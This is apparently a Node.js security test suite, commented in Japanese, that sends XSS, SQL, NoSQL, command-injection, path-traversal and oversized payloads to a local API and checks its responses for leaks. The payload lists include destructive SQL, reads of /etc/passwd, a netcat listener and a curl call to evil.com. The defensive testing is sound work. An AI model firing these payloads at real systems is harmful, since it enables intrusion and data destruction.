#!/usr/bin/env node
/**
 * セキュリティテスト
 * 入力検証・データサニタイゼーション・XSS/SQLインジェクション対策
 */

const API_BASE = 'http://localhost:3000';

class SecurityTestRunner {
  constructor() {
    this.tests = [];
    this.results = { passed: 0, failed: 0, total: 0 };
  }

  test(description, testFn) {
    this.tests.push({ description, testFn });
  }

  async run() {
    console.log('🔒 セキュリティテスト開始');
    console.log('=' .repeat(70));

    for (const { description, testFn } of this.tests) {
      this.results.total++;
      process.stdout.write(`  🛡️ ${description}... `);
      
      try {
        await testFn();
        console.log('✅ 成功');
        this.results.passed++;
      } catch (error) {
        console.log(`❌ 失敗: ${error.message}`);
        this.results.failed++;
      }
    }

    this.printSummary();
  }

  printSummary() {
    console.log('\n' + '=' .repeat(70));
    console.log('🏆 セキュリティテスト結果');
    console.log('=' .repeat(70));
    
    const successRate = Math.round((this.results.passed / this.results.total) * 100);
    
    console.log(`総テスト数: ${this.results.total}`);
    console.log(`成功: ${this.results.passed} ✅`);
    console.log(`失敗: ${this.results.failed} ❌`);
    console.log(`成功率: ${successRate}%`);

    if (this.results.failed === 0) {
      console.log('\n🎉 全セキュリティテスト成功！');
    } else {
      console.log(`\n⚠️ ${this.results.failed}件のセキュリティテスト失敗`);
    }
  }
}

// セキュリティテストユーティリティ
class SecurityTestUtils {
  static async makeRequest(endpoint, options = {}) {
    const response = await fetch(`${API_BASE}${endpoint}`, options);
    const text = await response.text();
    
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = text;
    }

    return {
      status: response.status,
      ok: response.ok,
      headers: Object.fromEntries(response.headers.entries()),
      data
    };
  }

  static generateSessionId() {
    return 'session-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  }

  static generateEventId() {
    return 'event-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  }

  static generateAnonymousUserId() {
    return 'user-' + Math.random().toString(36).substr(2, 12);
  }

  // XSSペイロード
  static getXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<iframe src="javascript:alert(\'XSS\')">',
      '{{7*7}}', // Template injection
      '${7*7}', // ES6 template literal injection
      '<%=7*7%>' // ASP template injection
    ];
  }

  // SQLインジェクションペイロード
  static getSQLInjectionPayloads() {
    return [
      "' OR 1=1--",
      "'; DROP TABLE users;--",
      "' UNION SELECT * FROM users--",
      "1' OR '1'='1",
      "admin'--",
      "' OR 1=1#",
      "' OR 'a'='a",
      "1; DELETE FROM sessions;--",
      "' UNION SELECT version()--",
      "' OR sleep(5)--"
    ];
  }

  // NoSQLインジェクションペイロード
  static getNoSQLInjectionPayloads() {
    return [
      { $ne: null },
      { $regex: '.*' },
      { $where: 'this.password.length > 0' },
      { $or: [{}] },
      { $gt: '' },
      { $exists: true }
    ];
  }

  // コマンドインジェクションペイロード
  static getCommandInjectionPayloads() {
    return [
      '; ls -la',
      '| whoami',
      '& ping -c 1 127.0.0.1',
      '`id`',
      '$(whoami)',
      '; cat /etc/passwd',
      '| nc -l 1234',
      '&& curl evil.com'
    ];
  }

  // パストラバーサルペイロード
  static getPathTraversalPayloads() {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '../../../../../../windows/system32/drivers/etc/hosts'
    ];
  }

  // 大量データ（DoS）ペイロード
  static getLargeDDoSPayloads() {
    return {
      largeString: 'A'.repeat(100000), // 100KB
      deepObject: this.createDeepObject(1000), // 1000レベル深い
      wideObject: this.createWideObject(10000), // 10000プロパティ
      largeArray: Array(50000).fill('data') // 50000要素
    };
  }

  static createDeepObject(depth) {
    let obj = { data: 'value' };
    for (let i = 0; i < depth; i++) {
      obj = { nested: obj };
    }
    return obj;
  }

  static createWideObject(width) {
    const obj = {};
    for (let i = 0; i < width; i++) {
      obj[`key_${i}`] = `value_${i}`;
    }
    return obj;
  }
}

const runner = new SecurityTestRunner();

// ===== XSS攻撃テスト =====
runner.test('XSS攻撃 - concernText入力', async () => {
  const xssPayloads = SecurityTestUtils.getXSSPayloads();
  
  for (const payload of xssPayloads) {
    const request = {
      sessionId: SecurityTestUtils.generateSessionId(),
      userExplicitInput: {
        concernText: payload
      },
      factors: {},
      requestTimestamp: new Date().toISOString()
    };

    const { status, data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // レスポンスにスクリプトタグが含まれていないことを確認
    const responseStr = JSON.stringify(data);
    if (responseStr.includes('<script>') || responseStr.includes('javascript:')) {
      throw new Error(`XSSペイロードがエスケープされずに返されました: ${payload}`);
    }

    // 一部のペイロードは拒否されるべき
    if (status === 200 && (payload.includes('<script>') || payload.includes('javascript:'))) {
      console.warn(`      ⚠️ 危険なXSSペイロードが受け入れられました: ${payload.substring(0, 20)}...`);
    }
  }
});

runner.test('XSS攻撃 - eventData内のHTMLタグ', async () => {
  const xssPayloads = SecurityTestUtils.getXSSPayloads();
  
  for (const payload of xssPayloads) {
    const event = {
      eventId: SecurityTestUtils.generateEventId(),
      sessionId: SecurityTestUtils.generateSessionId(),
      anonymousUserId: SecurityTestUtils.generateAnonymousUserId(),
      eventType: 'ui_shown',
      timestamp: new Date().toISOString(),
      eventData: {
        userInput: payload,
        description: `ユーザー入力: ${payload}`
      }
    };

    const { data } = await SecurityTestUtils.makeRequest('/v1/events/batch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: [event] })
    });

    // エラーレスポンスにもXSSペイロードが含まれていないことを確認
    const responseStr = JSON.stringify(data);
    if (responseStr.includes('<script>') && !responseStr.includes('&lt;script&gt;')) {
      throw new Error('イベントデータ内XSSペイロードが適切にエスケープされていません');
    }
  }
});

// ===== SQLインジェクション攻撃テスト =====
runner.test('SQLインジェクション攻撃 - sessionId', async () => {
  const sqlPayloads = SecurityTestUtils.getSQLInjectionPayloads();
  
  for (const payload of sqlPayloads) {
    const request = {
      sessionId: payload,
      userExplicitInput: {
        concernText: '通常の関心事'
      },
      factors: {},
      requestTimestamp: new Date().toISOString()
    };

    const { status, data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // SQLエラーが漏洩していないことを確認
    const responseStr = JSON.stringify(data).toLowerCase();
    const sqlErrorKeywords = ['sql', 'database', 'table', 'column', 'mysql', 'postgresql', 'sqlite'];
    
    for (const keyword of sqlErrorKeywords) {
      if (responseStr.includes(keyword) && responseStr.includes('error')) {
        console.warn(`      ⚠️ SQLエラーが漏洩している可能性: ${keyword}`);
      }
    }

    // 明らかにSQLペイロードが拒否されるべき場合
    if (status === 200 && payload.includes('DROP TABLE')) {
      console.warn(`      ⚠️ 危険なSQLペイロードが受け入れられました: ${payload}`);
    }
  }
});

runner.test('SQLインジェクション攻撃 - factors内の値', async () => {
  const sqlPayloads = SecurityTestUtils.getSQLInjectionPayloads();
  
  for (const payload of sqlPayloads) {
    const request = {
      sessionId: SecurityTestUtils.generateSessionId(),
      userExplicitInput: {
        concernText: '通常の関心事'
      },
      factors: {
        time_of_day: payload,
        user_input: `'; ${payload} --`,
        malicious_factor: payload
      },
      requestTimestamp: new Date().toISOString()
    };

    const { status, data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // データベースエラーが露出していないことを確認
    if (data && typeof data === 'object' && data.error) {
      const errorMsg = data.error.toLowerCase();
      if (errorMsg.includes('sql') || errorMsg.includes('database')) {
        throw new Error(`SQLエラーが露出しています: ${data.error}`);
      }
    }
  }
});

// ===== コマンドインジェクション攻撃テスト =====
runner.test('コマンドインジェクション攻撃', async () => {
  const cmdPayloads = SecurityTestUtils.getCommandInjectionPayloads();
  
  for (const payload of cmdPayloads) {
    const request = {
      sessionId: SecurityTestUtils.generateSessionId(),
      userExplicitInput: {
        concernText: `関心事 ${payload}`
      },
      factors: {
        user_agent: `Mozilla/5.0 ${payload}`,
        system_command: payload
      },
      requestTimestamp: new Date().toISOString()
    };

    const { status, data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // システムコマンドの出力が含まれていないことを確認
    const responseStr = JSON.stringify(data);
    const cmdOutputKeywords = ['root:', 'bin/bash', '/etc/', 'uid=', 'gid='];
    
    for (const keyword of cmdOutputKeywords) {
      if (responseStr.includes(keyword)) {
        throw new Error(`コマンド実行の結果が漏洩している可能性: ${keyword}`);
      }
    }
  }
});

// ===== パストラバーサル攻撃テスト =====
runner.test('パストラバーサル攻撃', async () => {
  const pathPayloads = SecurityTestUtils.getPathTraversalPayloads();
  
  for (const payload of pathPayloads) {
    // factorsに偽装したファイルパスを送信
    const request = {
      sessionId: SecurityTestUtils.generateSessionId(),
      userExplicitInput: {
        concernText: '通常の関心事'
      },
      factors: {
        config_file: payload,
        template_path: payload,
        log_file: payload
      },
      requestTimestamp: new Date().toISOString()
    };

    const { data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // ファイル内容が漏洩していないことを確認
    const responseStr = JSON.stringify(data);
    const fileContentKeywords = ['root:x:', '127.0.0.1', 'localhost', '[boot loader]'];
    
    for (const keyword of fileContentKeywords) {
      if (responseStr.includes(keyword)) {
        throw new Error(`ファイル内容が漏洩している可能性: ${keyword}`);
      }
    }
  }
});

// ===== DoS（サービス拒否）攻撃テスト =====
runner.test('DoS攻撃 - 大量データ送信', async () => {
  const dosPayloads = SecurityTestUtils.getLargeDDoSPayloads();
  
  // 大きな文字列
  const largeRequest = {
    sessionId: SecurityTestUtils.generateSessionId(),
    userExplicitInput: {
      concernText: dosPayloads.largeString
    },
    factors: dosPayloads.wideObject,
    requestTimestamp: new Date().toISOString()
  };

  const startTime = Date.now();
  const { status } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(largeRequest)
  });
  const responseTime = Date.now() - startTime;

  if (status === 413) {
    console.log('      ✓ ペイロードサイズ制限が適切に動作');
  } else if (status === 400) {
    console.log('      ✓ 大量データが適切に拒否されました');
  } else if (responseTime > 10000) {
    throw new Error(`レスポンス時間が異常に長い（DoS可能性）: ${responseTime}ms`);
  } else if (status === 200) {
    console.warn(`      ⚠️ 大量データが受け入れられました（${Math.round(dosPayloads.largeString.length / 1024)}KB）`);
  }
});

runner.test('DoS攻撃 - 深いネスト構造', async () => {
  const dosPayloads = SecurityTestUtils.getLargeDDoSPayloads();
  
  const deepRequest = {
    sessionId: SecurityTestUtils.generateSessionId(),
    userExplicitInput: {
      concernText: '通常の関心事'
    },
    factors: dosPayloads.deepObject,
    requestTimestamp: new Date().toISOString()
  };

  const startTime = Date.now();
  const { status } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(deepRequest)
  });
  const responseTime = Date.now() - startTime;

  if (responseTime > 5000) {
    console.warn(`      ⚠️ 深いネスト構造の処理時間が長い: ${responseTime}ms`);
  }
  
  if (status === 200) {
    console.log('      ✓ 深いネスト構造が適切に処理されました');
  }
});

// ===== 認証・認可バイパステスト =====
runner.test('認証バイパス - 不正なヘッダー', async () => {
  const maliciousHeaders = {
    'X-Forwarded-User': 'admin',
    'X-Real-IP': '127.0.0.1',
    'X-Original-URL': '/admin',
    'X-Rewrite-URL': '/admin',
    'Authorization': 'Bearer fake-token',
    'X-User-ID': 'admin',
    'X-Role': 'administrator'
  };

  for (const [header, value] of Object.entries(maliciousHeaders)) {
    const { status } = await SecurityTestUtils.makeRequest('/v1/config', {
      headers: { [header]: value }
    });

    if (status === 200) {
      // 現在は認証なしなので200は正常
      console.log(`      ✓ ヘッダー${header}は影響なし`);
    } else if (status === 403 || status === 401) {
      console.log(`      ✓ 不正ヘッダー${header}が適切に拒否されました`);
    }
  }
});

runner.test('セッションハイジャック対策', async () => {
  // 同じセッションIDで複数の異なるユーザーIDを送信
  const sessionId = SecurityTestUtils.generateSessionId();
  const userIds = ['user1', 'user2', 'admin', 'root'];
  
  for (const userId of userIds) {
    const event = {
      eventId: SecurityTestUtils.generateEventId(),
      sessionId: sessionId,
      anonymousUserId: userId,
      eventType: 'ui_shown',
      timestamp: new Date().toISOString()
    };

    const { status } = await SecurityTestUtils.makeRequest('/v1/events/batch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: [event] })
    });

    // 現在の実装では同じセッションに複数ユーザーが許可される可能性
    if (status === 200) {
      console.log(`      ⚠️ セッション${sessionId}でユーザー${userId}が受け入れられました`);
    }
  }
});

// ===== データリーク検証 =====
runner.test('機密データリーク検証', async () => {
  // 機密情報を含むリクエストを送信
  const sensitiveRequest = {
    sessionId: SecurityTestUtils.generateSessionId(),
    userExplicitInput: {
      concernText: '機密情報：パスワードはsecret123です'
    },
    factors: {
      credit_card: '4111-1111-1111-1111',
      ssn: '123-45-6789',
      email: 'user@example.com',
      api_key: 'sk-1234567890abcdef'
    },
    requestTimestamp: new Date().toISOString()
  };

  const { data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(sensitiveRequest)
  });

  // レスポンスに機密情報が含まれていないことを確認
  const responseStr = JSON.stringify(data);
  
  const sensitivePatterns = [
    /\d{4}-\d{4}-\d{4}-\d{4}/, // クレジットカード
    /\d{3}-\d{2}-\d{4}/, // SSN
    /sk-[a-f0-9]{32}/, // API key
    /secret123/ // パスワード
  ];

  for (const pattern of sensitivePatterns) {
    if (pattern.test(responseStr)) {
      console.warn('      ⚠️ 機密情報がレスポンスに含まれている可能性があります');
    }
  }
});

// ===== HTTPセキュリティヘッダー検証 =====
runner.test('セキュリティヘッダー検証', async () => {
  const { headers } = await SecurityTestUtils.makeRequest('/v1/config');
  
  const securityHeaders = {
    'X-Frame-Options': 'DENY',
    'X-Content-Type-Options': 'nosniff',
    'X-XSS-Protection': '1; mode=block',
    'Strict-Transport-Security': 'max-age=31536000',
    'Content-Security-Policy': true // 存在すれば良い
  };

  for (const [header, expectedValue] of Object.entries(securityHeaders)) {
    const actualValue = headers[header.toLowerCase()];
    
    if (!actualValue) {
      console.warn(`      ⚠️ セキュリティヘッダー不足: ${header}`);
    } else if (expectedValue !== true && actualValue !== expectedValue) {
      console.warn(`      ⚠️ ${header}の値が推奨値と異なります: ${actualValue}`);
    } else {
      console.log(`      ✓ ${header}: 適切に設定済み`);
    }
  }
});

// =====入力サニタイゼーション検証 =====
runner.test('入力サニタイゼーション - 特殊文字', async () => {
  const specialChars = [
    '\0', // NULL byte
    '\r\n', // CRLF injection
    '\t', // Tab
    '\b', // Backspace
    '\f', // Form feed
    String.fromCharCode(0x00), // NULL
    String.fromCharCode(0x1F), // Control characters
    '\\', // Backslash
    '"', // Double quote
    "'", // Single quote
    '`' // Backtick
  ];

  for (const char of specialChars) {
    const request = {
      sessionId: SecurityTestUtils.generateSessionId(),
      userExplicitInput: {
        concernText: `テスト${char}関心事`
      },
      factors: {
        special_char: char,
        combined: `value${char}end`
      },
      requestTimestamp: new Date().toISOString()
    };

    const { status, data } = await SecurityTestUtils.makeRequest('/v1/ui/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(request)
    });

    // レスポンスが正常で、特殊文字が適切に処理されている
    if (status === 200 && data) {
      const responseStr = JSON.stringify(data);
      
      // NULLバイトが除去されていることを確認
      if (char === '\0' && responseStr.includes('\0')) {
        throw new Error('NULLバイトが適切にサニタイズされていません');
      }
      
      // CRLF injection対策
      if (char === '\r\n' && responseStr.includes('\r\n')) {
        console.warn('      ⚠️ CRLF文字が残っています');
      }
    }
  }
});

// テスト実行
async function main() {
  console.log('⏳ サーバー準備確認（3秒待機）...');
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  await runner.run();
  
  if (runner.results.failed === 0) {
    console.log('\n✅ セキュリティテスト完了');
    process.exit(0);
  } else {
    console.log('\n❌ セキュリティテスト完了（一部失敗）');
    process.exit(1);
  }
}

// Node.jsの場合のみ実行
if (import.meta.url === `file://${process.argv[1]}`) {
  main();
}
